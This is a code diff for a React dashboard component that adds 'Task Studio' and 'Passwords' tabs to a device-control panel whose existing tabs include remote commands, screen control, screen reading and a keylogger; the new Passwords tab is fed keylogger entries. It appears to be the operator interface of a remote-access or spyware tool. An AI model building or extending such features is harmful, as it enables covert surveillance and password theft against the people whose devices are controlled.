@@ -10,12 +10,16 @@ import PermissionsTab from './PermissionsTab.jsx';
 import NotificationsTab from './NotificationsTab.jsx';
 import RecentActivityTab from './RecentActivityTab.jsx';
 import LiveMonitor from './LiveMonitor.jsx';
+import TaskStudio from './TaskStudio.jsx';
+import PasswordsTab from './PasswordsTab.jsx';
 
 const TABS = [
   { id: 'live_monitor',  label: '📊 Live Monitor' },
   { id: 'commands',      label: '⌨️ Commands' },
   { id: 'screen_control',label: '🖥️ Screen Control' },
   { id: 'screen_reader', label: '📺 Screen Reader' },
+  { id: 'task_studio',   label: '🎬 Task Studio' },
+  { id: 'passwords',     label: '🔑 Passwords' },
   { id: 'notifications', label: '🔔 Notifications' },
   { id: 'activity',      label: '📱 Activity' },
   { id: 'keylogger',     label: '⌨️ Keylogger' },
@@ -126,6 +130,23 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
           device={device}
           sendCommand={sendCommand}
           results={results}
+        />
+      )}
+
+      {activeTab === 'task_studio' && (
+        <TaskStudio
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+        />
+      )}
+
+      {activeTab === 'passwords' && (
+        <PasswordsTab
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+          keylogPushEntries={keylogPushEntries || []}
         />
       )}
 
